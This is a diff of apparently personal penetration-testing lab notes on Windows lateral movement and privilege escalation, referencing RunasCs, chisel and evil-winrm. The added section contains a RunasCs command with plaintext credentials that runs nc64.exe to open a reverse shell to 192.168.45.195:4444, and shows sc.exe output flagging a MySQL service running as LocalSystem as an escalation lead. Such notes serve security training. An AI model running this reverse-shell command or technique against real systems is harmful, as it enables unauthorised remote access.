@@ -1,3 +1,43 @@
+[[RunasCs]]
+[[WerTrigger]]
+[[chisel]]
+
+```
+.\RunasCs.exe thecybergeek winniethepooh "C:\xampp\htdocs\nc64.exe 192.168.45.195 4444 -e cmd.exe" -t 0
+```
+move from apache to thecybergeek
+
+
+```
+PS C:\Users\thecybergeek\Desktop> sc.exe qc MySQL
+sc.exe qc MySQL
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: MySQL
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\xampp\mysql\bin\mysqld.exe MySQL
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : MySQL
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+PS C:\Users\thecybergeek\Desktop>
+```
+`sc.exe` stands for **Service Control** —  
+it’s a **Windows command-line tool** used to manage the **Windows Service Control Manager (SCM)**.
+|`sc qc`|
+
+|                               |
+| ----------------------------- |
+| **Queries the configuration** |
+
+LocalSystem  ?  it is admin
+
+
+
+
 ps1 ans ps2 are module, need impordt first
 
 ```
@@ -34,6 +74,9 @@ netstat -ano
 ```
   
 [[evil-winrm]]
+
+
+how to use MySQL cmd
 
 
 To use **Evil-WinRM** (a tool for connecting to Windows Remote Management services), the following **ports must be open** on the target Windows machine:
